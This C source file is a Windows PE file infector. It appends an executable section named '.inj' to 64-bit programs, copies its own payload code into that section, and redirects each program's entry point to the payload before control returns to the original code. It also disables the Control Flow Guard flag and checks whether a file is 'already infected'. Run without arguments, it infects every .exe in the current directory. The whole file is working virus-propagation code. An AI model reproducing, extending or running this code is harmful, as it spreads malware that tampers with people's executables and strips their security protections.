#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define SECTION_NAME ".inj"

#define ALIGN_UP(x, align) (((x) + (align) - 1) & ~((align) - 1))
#define MAX(x, y) (((x) > (y)) ? (x) : (y))

/**
 * Allocates and loads the target file into memory.
 * 
 * @brief Opens a file and reads its contents into a buffer.
 *
 * @param filename Path to the file to open.
 * @param hFile Pointer to a HANDLE to receive the file handle.
 * @param fileBuffer Pointer to a BYTE* to receive the allocated file buffer.
 * @param fileSize Pointer to a DWORD to receive the file size.
 *
 * @return 0 on success, non-zero on failure.
 */
int load_file(
  const char *filename,
  HANDLE *hFile,
  BYTE **fileBuffer,
  DWORD *fileSize
) {
    printf("[DEBUG] Opening file: %s\n", filename);
    *hFile = CreateFileA(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (*hFile == INVALID_HANDLE_VALUE) {
        printf("[ERROR] Unable to open file\n");
        return 1;
    }
    *fileSize = GetFileSize(*hFile, NULL);
    printf("[DEBUG] File size: %lu\n", *fileSize);
    *fileBuffer = (BYTE *)HeapAlloc(GetProcessHeap(), 0, *fileSize);
    if (!*fileBuffer) {
        printf("[ERROR] Memory allocation failed\n");
        CloseHandle(*hFile);
        return 1;
    }
    DWORD bytesRead;
    if (!ReadFile(*hFile, *fileBuffer, *fileSize, &bytesRead, NULL) || bytesRead != *fileSize) {
        printf("[ERROR] File read failed\n");
        HeapFree(GetProcessHeap(), 0, *fileBuffer);
        CloseHandle(*hFile);
        return 1;
    }
    printf("[DEBUG] File loaded into memory\n");
    return 0;
}

/**
 * Validates and parses the PE headers.
 * 
 * @brief Checks the DOS and NT headers for validity and extracts necessary information. In our case, we only want a 64-bit NT header.
 *
 * @param fileBuffer Pointer to the loaded file buffer.
 * @param dos Pointer to receive the IMAGE_DOS_HEADER*.
 * @param nt Pointer to receive the IMAGE_NT_HEADERS64*.
 *
 * @return 0 on success, non-zero on failure.
 */
int parse_pe_headers(
  BYTE *fileBuffer,
  IMAGE_DOS_HEADER **dos,
  IMAGE_NT_HEADERS64 **nt
) {
    *dos = (IMAGE_DOS_HEADER *)fileBuffer;
    if ((*dos)->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[ERROR] Invalid DOS signature\n");
        return 1;
    }
    printf("[DEBUG] DOS signature OK\n");
    *nt = (IMAGE_NT_HEADERS64 *)(fileBuffer + (*dos)->e_lfanew);
    if ((*nt)->Signature != IMAGE_NT_SIGNATURE || (*nt)->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        printf("[ERROR] Invalid NT signature or architecture\n");
        return 1;
    }
    printf("[DEBUG] NT signature and architecture OK\n");
    return 0;
}

/**
 * Prepares the new section header for the payload injection.
 * 
 * @brief Fills the new section header with appropriate values based on the last section.
 *
 * @param newSection Pointer to the IMAGE_SECTION_HEADER to fill.
 * @param lastSection Pointer to the last IMAGE_SECTION_HEADER in the file.
 * @param lastSectionSize Size of the last section.
 * @param section_align Section alignment value from PE header.
 * @param file_align File alignment value from PE header.
 * @param payload_size Size of the payload to inject.
 */
void prepare_new_section(
  IMAGE_SECTION_HEADER *newSection,
  IMAGE_SECTION_HEADER *lastSection,
  DWORD lastSectionSize,
  DWORD section_align,
  DWORD file_align,
  DWORD payload_size
) {
    memcpy(newSection->Name, SECTION_NAME, IMAGE_SIZEOF_SHORT_NAME);
    newSection->VirtualAddress = ALIGN_UP(lastSection->VirtualAddress + lastSectionSize, section_align);
    newSection->PointerToRawData = ALIGN_UP(lastSection->PointerToRawData + lastSection->SizeOfRawData, file_align);
    newSection->Misc.VirtualSize = payload_size;
    newSection->SizeOfRawData = ALIGN_UP(payload_size, file_align);
    newSection->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
    printf("[DEBUG] New section .inj RVA=0x%08X, RAW=0x%08X, size=%lu\n", newSection->VirtualAddress, newSection->PointerToRawData, payload_size);
}

/**
 * Patches the payload with the correct delta value.
 * 
 * @brief Copies the original payload and patches it with the old entry point offset.
 *
 * @param payload_copy Pointer to the buffer to receive the patched payload.
 * @param payload Pointer to the original payload.
 * @param payload_size Size of the payload.
 * @param offset_delta Offset in the payload where the delta should be patched.
 * @param oldEntryPointOffset Value to patch (relative offset to OEP).
 */
void patch_payload(
  BYTE *payload_copy,
  BYTE *payload,
  size_t payload_size,
  size_t offset_delta,
  LONGLONG oldEntryPointOffset
) {
    memcpy(payload_copy, payload, payload_size);
    printf("[DEBUG] Patching payload at offset %zu with old entry point offset 0x%llX\n", offset_delta, (unsigned long long)oldEntryPointOffset);
    // Patch the delta in the payload
    *(LONGLONG *)(payload_copy + offset_delta) = oldEntryPointOffset;
    printf("[DEBUG] Patch delta at offset %zu with value 0x%llX\n", offset_delta, (unsigned long long)oldEntryPointOffset);
}

/**
 * Updates the PE headers for the new section and entry point.
 * 
 * @brief Increments the number of sections, updates the size of the image, and sets the new entry point.
 *
 * @param nt Pointer to the IMAGE_NT_HEADERS64 to update.
 * @param newSection Pointer to the new IMAGE_SECTION_HEADER.
 * @param payload_size Size of the payload.
 * @param section_align Section alignment value from PE header.
 */
void update_pe_headers(
  IMAGE_NT_HEADERS64 *nt,
  IMAGE_SECTION_HEADER *newSection,
  DWORD payload_size,
  DWORD section_align
) {
    printf("[DEBUG] Updating PE headers...\n");
    printf("[DEBUG] Old Entry Point: 0x%08X\n", nt->OptionalHeader.AddressOfEntryPoint);
    nt->FileHeader.NumberOfSections += 1;
    nt->OptionalHeader.SizeOfImage = newSection->VirtualAddress + ALIGN_UP(payload_size, section_align);
    nt->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;
    nt->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_GUARD_CF;
    printf("[DEBUG] New entry point: 0x%08X\n", nt->OptionalHeader.AddressOfEntryPoint);
}

/**
 * Writes the updated NT headers and section headers to the file.
 * 
 * @brief Writes the NT headers and all section headers, including the new one, back to the file.
 *
 * @param hFile Handle to the file.
 * @param dos Pointer to the IMAGE_DOS_HEADER.
 * @param nt Pointer to the IMAGE_NT_HEADERS64.
 * @param sections Pointer to the first IMAGE_SECTION_HEADER.
 * @param oldNumberOfSections Number of sections before injection.
 * @param newSection Pointer to the new IMAGE_SECTION_HEADER.
 *
 * @return 0 on success, non-zero on failure.
 */
int write_headers(
  HANDLE hFile,
  IMAGE_DOS_HEADER *dos,
  IMAGE_NT_HEADERS64 *nt,
  IMAGE_SECTION_HEADER *sections,
  WORD oldNumberOfSections,
  IMAGE_SECTION_HEADER *newSection
) {
    SetFilePointer(hFile, dos->e_lfanew, NULL, FILE_BEGIN);
    DWORD ntHeadersSize = sizeof(IMAGE_NT_HEADERS64) + nt->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
    BYTE *ntHeadersBuffer = (BYTE *)HeapAlloc(GetProcessHeap(), 0, ntHeadersSize);
    if (!ntHeadersBuffer) {
        printf("[ERROR] Memory allocation for NT headers failed\n");
        return 1;
    }
    memcpy(ntHeadersBuffer, nt, sizeof(IMAGE_NT_HEADERS64));
    memcpy(ntHeadersBuffer + sizeof(IMAGE_NT_HEADERS64), sections, oldNumberOfSections * sizeof(IMAGE_SECTION_HEADER));
    memcpy(ntHeadersBuffer + sizeof(IMAGE_NT_HEADERS64) + oldNumberOfSections * sizeof(IMAGE_SECTION_HEADER), newSection, sizeof(IMAGE_SECTION_HEADER));
    printf("[DEBUG] Writing NT headers and sections...\n");
    DWORD bytesWritten;
    if (!WriteFile(hFile, ntHeadersBuffer, ntHeadersSize, &bytesWritten, NULL) || bytesWritten != ntHeadersSize) {
        printf("[ERROR] Writing NT headers failed\n");
        HeapFree(GetProcessHeap(), 0, ntHeadersBuffer);
        return 1;
    }
    HeapFree(GetProcessHeap(), 0, ntHeadersBuffer);
    return 0;
}

/**
 * Writes the payload to the new section in the file.
 * 
 * @brief Sets the file pointer to the new section's raw data offset and writes the payload.
 *
 * @param hFile Handle to the file.
 * @param newSection Pointer to the new IMAGE_SECTION_HEADER.
 * @param payload_copy Pointer to the payload buffer.
 * @param payload_size Size of the payload.
 *
 * @return 0 on success, non-zero on failure.
 */
int write_payload(
  HANDLE hFile,
  IMAGE_SECTION_HEADER *newSection,
  BYTE *payload_copy,
  DWORD payload_size
) {
    printf("[DEBUG] Writing payload to new section...\n");
    SetFilePointer(hFile, newSection->PointerToRawData, NULL, FILE_BEGIN);
    DWORD bytesWritten;
    if (!WriteFile(hFile, payload_copy, payload_size, &bytesWritten, NULL) || bytesWritten != payload_size) {
        printf("[ERROR] Writing payload failed\n");
        return 1;
    }
    return 0;
}

/**
 * Fills the rest of the new section with zero padding if needed.
 * 
 * @brief Checks if the new section's size is larger than the payload size and writes zero bytes to fill the gap.
 *
 * @param hFile Handle to the file.
 * @param newSection Pointer to the new IMAGE_SECTION_HEADER.
 * @param payload_size Size of the payload.
 *
 * @return 0 on success, non-zero on failure.
 */
int pad_section(
  HANDLE hFile,
  IMAGE_SECTION_HEADER *newSection,
  DWORD payload_size
) {
    if (newSection->SizeOfRawData > payload_size) {
        DWORD zeroSize = newSection->SizeOfRawData - payload_size;
        BYTE *zeroBuffer = (BYTE *)calloc(1, zeroSize);
        if (!zeroBuffer) {
            printf("[ERROR] Memory allocation for padding failed\n");
            return 1;
        }
        printf("[DEBUG] Padding of %lu bytes added to .inj section\n", zeroSize);
        DWORD bytesWritten;
        if (!WriteFile(hFile, zeroBuffer, zeroSize, &bytesWritten, NULL) || bytesWritten != zeroSize) {
            printf("[ERROR] Writing padding failed\n");
            free(zeroBuffer);
            return 1;
        }
        free(zeroBuffer);
    }
    return 0;
}

/**
 * Checks if the PE file is already infected.
 * 
 * @brief Checks each section header to see if the target section already exists.
 *
 * @param nt Pointer to the IMAGE_NT_HEADERS64.
 * @param sections Pointer to the first IMAGE_SECTION_HEADER.
 *
 * @return 1 if already infected, 0 otherwise.
 */
int is_already_infected(
  IMAGE_NT_HEADERS64 *nt,
  IMAGE_SECTION_HEADER *sections
) {
    int i;
    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (strncmp((const char *)sections[i].Name, SECTION_NAME, strlen(SECTION_NAME)) == 0) {
            printf("[DEBUG] Section '%s' found: already infected.\n", SECTION_NAME);
            return 1;
        }
    }
    return 0;
}

/**
 * Main injection logic.
 * 
 * @brief Loads the target file, parses its headers, checks for existing infection, prepares a new section, patches the payload, updates headers, and writes everything back to the file.
 *
 * @param filename Path to the file to inject.
 *
 * @return 0 on success, non-zero on failure.
 */
int inject(const char *filename) {
    extern char __start_code;
    extern char __end_code;
    BYTE *payload = (BYTE *)&__start_code;
    DWORD payload_size = (DWORD)(&__end_code - &__start_code);
    extern uint64_t delta;

    HANDLE hFile;
    BYTE *fileBuffer;
    DWORD fileSize;
    if (load_file(filename, &hFile, &fileBuffer, &fileSize)) {
        return 1;
    }

    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS64 *nt;
    if (parse_pe_headers(fileBuffer, &dos, &nt)) {
        HeapFree(GetProcessHeap(), 0, fileBuffer);
        CloseHandle(hFile);
        return 1;
    }

    if (is_already_infected(nt, (IMAGE_SECTION_HEADER *)((BYTE *)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader))) {
        printf("[ERROR] Target file is already infected\n");
        HeapFree(GetProcessHeap(), 0, fileBuffer);
        CloseHandle(hFile);
        return 1;
    }

    DWORD file_align = nt->OptionalHeader.FileAlignment;
    DWORD section_align = nt->OptionalHeader.SectionAlignment;
    IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER *)((BYTE *)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
    IMAGE_SECTION_HEADER *lastSection = &sections[nt->FileHeader.NumberOfSections - 1];
    DWORD lastSectionSize = MAX(lastSection->Misc.VirtualSize, lastSection->SizeOfRawData);
    printf("[DEBUG] Last section at virtual address 0x%08X\n", lastSection->VirtualAddress);

    IMAGE_SECTION_HEADER newSection = {0};
    prepare_new_section(&newSection, lastSection, lastSectionSize, section_align, file_align, payload_size);

    size_t offset_delta = (size_t)((BYTE *)&delta - payload);
    printf("[DEBUG] Offset delta for patching: %zu\n", offset_delta);
    BYTE *payload_copy = (BYTE *)malloc(payload_size);
    if (!payload_copy) {
        printf("[ERROR] Memory allocation for payload failed\n");
        HeapFree(GetProcessHeap(), 0, fileBuffer);
        CloseHandle(hFile);
        return 1;
    }

    // Patch the payload with the old entry point offset
    LONGLONG OEPoffset = (LONGLONG) nt->OptionalHeader.AddressOfEntryPoint - newSection.VirtualAddress;
    printf("[DEBUG] Original OEP offset: 0x%llX\n", OEPoffset);
    patch_payload(payload_copy, payload, payload_size, offset_delta, OEPoffset);

    WORD oldNumberOfSections = nt->FileHeader.NumberOfSections;
    update_pe_headers(nt, &newSection, payload_size, section_align);

    if (write_headers(hFile, dos, nt, sections, oldNumberOfSections, &newSection)) {
        free(payload_copy);
        HeapFree(GetProcessHeap(), 0, fileBuffer);
        CloseHandle(hFile);
        return 1;
    }
    if (write_payload(hFile, &newSection, payload_copy, payload_size)) {
        free(payload_copy);
        HeapFree(GetProcessHeap(), 0, fileBuffer);
        CloseHandle(hFile);
        return 1;
    }
    if (pad_section(hFile, &newSection, payload_size)) {
        free(payload_copy);
        HeapFree(GetProcessHeap(), 0, fileBuffer);
        CloseHandle(hFile);
        return 1;
    }
    printf("[DEBUG] Injection completed successfully!\n");
    free(payload_copy);
    HeapFree(GetProcessHeap(), 0, fileBuffer);
    CloseHandle(hFile);
    return 0;
}

/**
 * Entry point for the injector program.
 * 
 * @brief Parses command line arguments and calls the inject function with the provided executable file.
 *
 * @param argc Argument count.
 * @param argv Argument vector.
 *
 * @return 0 on success, non-zero on failure.
 */
int main(int argc, char **argv) {
    if (argc == 2) {
        // Inject into the file passed as argument
        return inject(argv[1]);
    } else {
        // Inject into all .exe files in the current directory
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA("*.exe", &findData);
        if (hFind == INVALID_HANDLE_VALUE) {
            printf("[ERROR] No .exe files found in current directory\n");
            return 1;
        }
        int result = 0;
        do {
            printf("[INFO] Injecting into: %s\n", findData.cFileName);
            int r = inject(findData.cFileName);
            if (r != 0) {
                printf("[ERROR] Injection failed for %s\n", findData.cFileName);
                result = r;
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
        return result;
    }
}